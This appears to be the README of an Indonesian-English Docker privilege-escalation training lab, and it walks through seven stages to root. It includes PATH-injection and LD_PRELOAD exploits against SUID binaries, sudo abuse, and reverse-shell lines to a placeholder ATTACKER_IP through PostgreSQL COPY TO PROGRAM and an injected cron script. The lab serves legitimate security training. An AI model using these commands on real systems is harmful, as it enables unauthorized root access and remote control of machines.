# 🔐 Advanced Privilege Escalation Lab - 7 Stage Exploit Chain

## Overview
Lab ini dirancang untuk pelatihan keamanan internal perusahaan dan penelitian. Terdapat 7 tahap exploit chain yang mengarah ke root privilege escalation. Setiap stage memiliki vulnerabilitas berbeda yang harus dipahami dan dieksploitasi secara berurutan.

**Level: HARD (Black Box)**  
**Target: Gain ROOT access**  
**Akses: SSH only**

---

## 📋 Lab Setup & Requirements

### Prerequisites
- Docker & Docker Compose
- SSH client
- Linux environment knowledge
- Basic privilege escalation concepts

### Quick Start

```bash
# Build Docker image
docker build -t privesc-lab .

# Run container
docker run -d --name privesc-lab -p 2222:22 privesc-lab

# Access via SSH
ssh -p 2222 player1@localhost
# Password: password123
```

### docker-compose.yml (Alternative)
```yaml
version: '3.8'
services:
  privesc-lab:
    build: .
    ports:
      - "2222:22"
    container_name: privesc-lab
    restart: unless-stopped
    healthcheck:
      test: ["CMD", "ssh", "-o", "StrictHostKeyChecking=no", "player1@127.0.0.1"]
      interval: 30s
      timeout: 10s
      retries: 3
```

---

## 🎯 7-Stage Exploit Chain Analysis

### Stage 1: Initial Access & User Enumeration
**Vulnerability Type:** Weak Default Credentials + Information Disclosure

**Description:**
- User `player1` has weak password: `password123`
- Multiple users exist on system with different privilege levels
- SSH access is available without restrictions

**Vulnerabilities:**
- Weak password policy
- User enumeration possible via /etc/passwd
- No account lockout mechanism

**Access Method:**
```bash
ssh -p 2222 player1@localhost
# Password: password123
```

**Stage 1 Objective:** Gain access as `player1` user

**Flag Location:** Available after successful SSH login

**Exploitation Steps:**
1. SSH into the system with player1 credentials
2. Enumerate system users: `cat /etc/passwd`
3. Check user groups: `id`
4. List available commands

**Flag:** `FLAG{stage_1_initial_access}`

---

### Stage 2: User Enumeration & File Permission Discovery
**Vulnerability Type:** Improper File Permissions + Credential Exposure

**Description:**
- `/home/shared/credentials.txt` memiliki permission 644 (world-readable)
- Berisi database credentials dan sensitive information
- Menunjukkan eksistensi user lain yang bisa diakses

**Vulnerabilities:**
- Credentials stored in plaintext
- World-readable sensitive files
- Weak permission model
- Service account credentials exposed

**Exploitation Path:**
```bash
# List files in shared directory
ls -la /home/shared/

# Read credentials
cat /home/shared/credentials.txt

# Enumerate backup user
id backup
groups backup

# Check accessible locations
ls -la /opt/backup/

# Try switching user
su - backup
# Password: BackupPass@123 (found in credentials.txt or guessable)
```

**Flag:** `FLAG{stage_2_user_enumeration}`

**Key Findings:**
- Database credentials: `pwner:password123`
- MySQL root password: `SuperSecret@2024`
- Access to backup user gained

---

### Stage 3: SUID Binary Exploitation - PATH Injection
**Vulnerability Type:** SUID Binary + Unsafe system() call + PATH Manipulation

**Description:**
- Binary `/usr/local/bin/run-backup` memiliki SUID bit set (owned by root)
- Binary menggunakan `system("backup-runner")` tanpa full path
- Vulnerable terhadap PATH injection attack

**Vulnerabilities:**
- SUID binary with insecure system() call
- Relative path execution
- No PATH sanitization
- Executable by developers group

**Exploitation Path:**
```bash
# Check SUID binary
ls -la /usr/local/bin/run-backup
file /usr/local/bin/run-backup

# Analyze dengan strings
strings /usr/local/bin/run-backup

# Check current PATH
echo $PATH

# Create malicious backup-runner
mkdir -p /tmp/path_exploit
cat > /tmp/path_exploit/backup-runner << 'EVIL'
#!/bin/bash
/bin/bash
EVIL

chmod +x /tmp/path_exploit/backup-runner

# Prepend malicious path
export PATH=/tmp/path_exploit:$PATH

# Execute SUID binary - akan menjalankan /bash sebagai root
run-backup

# Verify root access
id
whoami
```

**Flag:** `FLAG{stage_3_suid_exploitation}`

**Alternative Method: LD_PRELOAD**
```bash
# Gunakan check-user SUID binary
# Create malicious library
cat > /tmp/lib.c << 'EOF'
#include <stdlib.h>
#include <unistd.h>

void __attribute__((constructor)) init() {
    setuid(0);
    system("/bin/bash");
}
EOF

gcc -shared -fPIC -o /tmp/lib.so /tmp/lib.c

# Exploit
LD_PRELOAD=/tmp/lib.so /usr/local/bin/check-user
```

---

### Stage 4: Database Access & Credential Extraction
**Vulnerability Type:** Weak Database Credentials + SQL Injection Ready

**Description:**
- PostgreSQL running dengan credentials: `pwner:password123`
- Credentials tersimpan di plaintext di credentials.txt
- Database berisi sensitive information

**Vulnerabilities:**
- Weak database password
- Credentials in plaintext
- Database accessible from application
- SQL functions available

**Exploitation Path:**
```bash
# Connect ke PostgreSQL
psql -h localhost -U pwner -d postgres

# List databases
\l

# List tables
\dt

# View secret_flag table
SELECT * FROM secret_flag;

# Create new admin user (if permissions allow)
CREATE ROLE admin WITH LOGIN PASSWORD 'admin123';

# Check PostgreSQL version for specific exploits
SELECT version();

# Check if superuser
SELECT usesuper FROM pg_user WHERE usename = 'pwner';

# List all users
SELECT * FROM pg_user;

# Check for UDF vulnerabilities
SELECT * FROM pg_proc WHERE proname LIKE '%exec%';
```

**Flag in Database:** `FLAG{stage_4_db_access}`

**Advanced Exploitation:**
```bash
# If you can get COPY/WRITE access
COPY (SELECT 1) TO PROGRAM 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1';

# Or using psql copy feature
\copy (select 1) to program 'id > /tmp/proof.txt'
```

---

### Stage 5: Environment Variables & Secrets Discovery
**Vulnerability Type:** Secrets in Environment + Readable Scripts

**Description:**
- `/opt/vault/env.sh` berisi environment variables dengan secrets
- File readable oleh multiple users
- Credentials hardcoded dalam shell scripts

**Vulnerabilities:**
- Secrets in environment files
- Readable configuration files
- Hardcoded credentials in scripts
- No secret management

**Exploitation Path:**
```bash
# Find environment files
find /opt -name "*.sh" -o -name "*.env" 2>/dev/null

# Read vault environment
cat /opt/vault/env.sh

# Source and check
source /opt/vault/env.sh
echo $MASTER_SECRET
echo $DB_ADMIN_PASS
echo $API_KEY

# Find scripts with hardcoded credentials
grep -r "password\|passwd\|secret\|key" /opt --include="*.sh" 2>/dev/null

# Check /opt/services/backup.sh
cat /opt/services/backup.sh

# Extract DB credentials from backup script
# DB_PASS="SuperSecret@2024"
```

**Flag:** `FLAG{stage_5_env_variables}`

**Credentials Found:**
- API_KEY: API_KEY_STAGE5_SECRET
- DB_ADMIN_PASS: Admin@2024
- MASTER_SECRET: FLAG{stage_5_env_variables}

---

### Stage 6: Sudo Misconfiguration & Privilege Abuse
**Vulnerability Type:** Insecure Sudo Rules + Command Substitution

**Description:**
- Sudoers file memiliki NOPASSWD rules untuk certain commands
- Developers group bisa run /usr/local/bin/run-backup sebagai root
- Jenkins user bisa run check-user sebagai devops

**Vulnerabilities:**
- NOPASSWD sudo rules
- Privilege escalation via sudoers
- Group-based privilege escalation
- Command substitution possible

**Exploitation Path:**
```bash
# Check sudo privileges (jika belum root)
sudo -l

# Output akan menunjukkan:
# (root) NOPASSWD: /usr/local/bin/run-backup

# Execute dengan sudo
sudo /usr/local/bin/run-backup

# Atau switch ke jenkins user dulu (jika credentials ada)
su - jenkins
# Password: JenkinsCI@2024

# Dari jenkins, check sudo
sudo -l

# Run as devops
sudo -u devops /usr/local/bin/check-user

# Dari devops, check lagi
sudo -l

# Escalate to root
sudo -i
```

**Flag:** `FLAG{stage_6_sudo_misconfiguration}`

**Sudoers Configuration Analysis:**
```
%developers ALL=(root) NOPASSWD: /usr/local/bin/run-backup
%webusers ALL=(root) NOPASSWD: /usr/bin/service
jenkins ALL=(devops) NOPASSWD: /usr/local/bin/check-user
```

---

### Stage 7: Kernel Exploit & Final Root Privilege Escalation
**Vulnerability Type:** Insecure SUID Binary Chains + Kernel Vulnerability

**Description:**
- Final stage memerlukan kombinasi semua pengetahuan sebelumnya
- Multiple paths menuju root access
- Kernel vulnerability atau SUID chain exploitation

**Vulnerabilities:**
- Incomplete SUID binary validation
- Kernel version vulnerabilities (CVE-2021-22555, CVE-2021-4034, etc.)
- Sudo edge cases
- Writable kernel modules

**Exploitation Paths:**

**Path 1: Complete SUID Chain**
```bash
# Use all previous stage exploits
# 1. Gain access via weak credentials (Stage 1)
ssh player1@localhost

# 2. Get credentials from shared (Stage 2)
cat /home/shared/credentials.txt

# 3. Switch to backup user
su - backup

# 4. Use PATH injection on SUID binary
mkdir -p /tmp/pwn
cat > /tmp/pwn/id << 'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /tmp/pwn/id

export PATH=/tmp/pwn:$PATH
run-backup  # This executes as root via SUID

# 5. Now you have root shell
id
whoami
```

**Path 2: Kernel Exploit (if applicable)**
```bash
# Check kernel version
uname -a

# Look for known CVEs
# Common: CVE-2021-22555, CVE-2021-4034, CVE-2022-0847

# Compile and run exploit (if vulnerable)
gcc -o exploit /tmp/exploit.c
./exploit
id
```

**Path 3: Cron Job Exploitation**
```bash
# Cron job runs every 5 minutes as root
# Edit backup.sh if writable

cat /opt/services/backup.sh

# If writable, inject reverse shell
cat >> /opt/services/backup.sh << 'EOF'
nc -e /bin/bash ATTACKER_IP PORT
EOF

# Wait for cron execution (max 5 minutes)
# Alternatively monitor process
watch -n 1 'ps aux | grep backup'
```

**Flag:** `FLAG{stage_7_kernel_privesc_root}`

**Final Verification:**
```bash
# Confirm root access
id
whoami
cat /root/.flag_final

# Read other flags
cat /tmp/.flag_*

# Check root home
ls -la /root/
```

---

## 🛠️ Complete Exploit Cheatsheet

### Quick Reference - All 7 Stages

```bash
#!/bin/bash
# STAGE 1: Initial SSH Access
ssh -p 2222 player1@localhost
# password123

# STAGE 2: Credential Discovery
cat /home/shared/credentials.txt
su - backup
# BackupPass@123

# STAGE 3: SUID PATH Injection
mkdir -p /tmp/path_inject
cat > /tmp/path_inject/backup-runner << 'EOF'
#!/bin/bash
/bin/bash -i
EOF
chmod +x /tmp/path_inject/backup-runner
export PATH=/tmp/path_inject:$PATH
run-backup
# Now as root or elevated

# STAGE 4: Database Access
psql -h localhost -U pwner -d postgres
# password: password123
SELECT * FROM secret_flag;

# STAGE 5: Environment Secrets
cat /opt/vault/env.sh
source /opt/vault/env.sh
echo $MASTER_SECRET

# STAGE 6: Sudo Escalation
sudo -l
sudo /usr/local/bin/run-backup
# Or switch to jenkins
su - jenkins
sudo -u devops /usr/local/bin/check-user

# STAGE 7: Root Access
# Use combination of above
# Or direct kernel exploit
id
whoami
cat /root/.flag_final
```

---

## 📊 Vulnerability Summary

| Stage | Type | Severity | CVSS | Technique |
|-------|------|----------|------|-----------|
| 1 | Weak Credentials | HIGH | 8.5 | Brute Force/Default Credentials |
| 2 | Insecure Permissions | HIGH | 8.0 | File Permission Exploitation |
| 3 | SUID Binary PATH Injection | CRITICAL | 9.0 | PATH Manipulation |
| 4 | Weak Database Password | HIGH | 8.2 | SQL Access + Info Disclosure |
| 5 | Secrets in Config | HIGH | 8.1 | Configuration File Exposure |
| 6 | Sudo Misconfiguration | CRITICAL | 9.2 | Privilege Escalation |
| 7 | SUID + Kernel | CRITICAL | 9.8 | Privilege Escalation Chain |

---

## 🎓 Learning Objectives

Setelah menyelesaikan lab ini, Anda akan memahami:

1. ✅ User enumeration dan reconnaissance
2. ✅ Weak credential exploitation
3. ✅ File permission vulnerabilities
4. ✅ SUID binary exploitation techniques
5. ✅ PATH manipulation attacks
6. ✅ Database credential extraction
7. ✅ Secrets management issues
8. ✅ Sudo misconfiguration exploitation
9. ✅ Privilege escalation chaining
10. ✅ Kernel vulnerability exploitation

---

## 🔍 Debugging Tips

### Check Service Status
```bash
systemctl status postgresql
systemctl status nginx
systemctl status ssh

ps aux | grep -E "postgres|nginx|ssh"
```

### Monitor System Events
```bash
# Check cron execution
grep CRON /var/log/syslog

# Monitor processes
watch -n 1 'ps aux'

# Check open ports
netstat -tlnp
ss -tlnp
```

### Troubleshooting

**Problem:** SSH not responding
```bash
docker logs privesc-lab
docker exec -it privesc-lab service ssh status
docker exec -it privesc-lab service ssh restart
```

**Problem:** Cron not executing
```bash
docker exec -it privesc-lab crontab -l
docker exec -it privesc-lab tail -f /var/log/syslog
```

**Problem:** Database not starting
```bash
docker exec -it privesc-lab service postgresql status
docker exec -it privesc-lab service postgresql restart
docker exec -it privesc-lab sudo -u postgres psql -c "SELECT 1"
```

---

## 📝 Lab Reset & Cleanup

```bash
# Stop and remove container
docker stop privesc-lab
docker rm privesc-lab

# Rebuild fresh
docker build --no-cache -t privesc-lab .
docker run -d --name privesc-lab -p 2222:22 privesc-lab
```

---

## 🎖️ Success Criteria

Anda telah menyelesaikan lab jika dapat:
- [ ] Gain initial shell access (Stage 1)
- [ ] Extract database credentials (Stage 2)
- [ ] Exploit SUID binary (Stage 3)
- [ ] Access database (Stage 4)
- [ ] Find environment secrets (Stage 5)
- [ ] Escalate via Sudo (Stage 6)
- [ ] Reach root access (Stage 7)
- [ ] Collect all flags
- [ ] Understand complete exploit chain

---

## ⚠️ Important Notes

- **Black Box Challenge:** Minimal hints provided. Reconnaissance skills required.
- **Multiple Paths:** Different stages can be exploited in multiple ways.
- **Progressive Difficulty:** Each stage is progressively harder.
- **Real-world Scenario:** Based on actual privilege escalation scenarios.
- **Educational Use Only:** Lab dirancang untuk pelatihan keamanan internal.

---

## 📚 References & Further Reading

- [OWASP Privilege Escalation](https://owasp.org/www-community/attacks/Privilege_escalation)
- [GTFOBins - SUID Exploitation](https://gtfobins.github.io/)
- [Sudo Privilege Escalation](https://sudo.ws/security/advisories/)
- [Kernel CVE Database](https://www.cvedetails.com/vulnerability-list/vendor_id-33/Kernel/)
- [Linux Privilege Escalation Guide](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)

---

## 🤝 Support & Feedback

Untuk pertanyaan atau feedback tentang lab:
- Dokumentasi: Lihat bagian relevant di README ini
- Troubleshooting: Cek bagian Debugging Tips
- Reset Lab: Ikuti prosedur di Lab Reset section

**Lab Version:** 1.0  
**Last Updated:** 2024  
**Difficulty:** HARD (Black Box)
